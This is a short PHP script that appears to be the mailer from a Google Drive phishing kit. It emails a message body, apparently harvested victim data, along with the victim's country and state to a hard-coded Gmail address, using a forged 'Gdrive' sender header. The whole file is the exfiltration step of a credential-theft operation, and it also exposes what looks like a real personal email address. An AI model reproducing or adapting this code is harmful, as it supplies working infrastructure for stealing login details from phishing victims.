<?php

$to = "nnvp1982@gmail.com";
$subject = "G&Drive 1st $country | $state";
$from = "From: Gdrive<newidea@alliancellc.com>";

mail($to,$subject,$msg,$from);

?>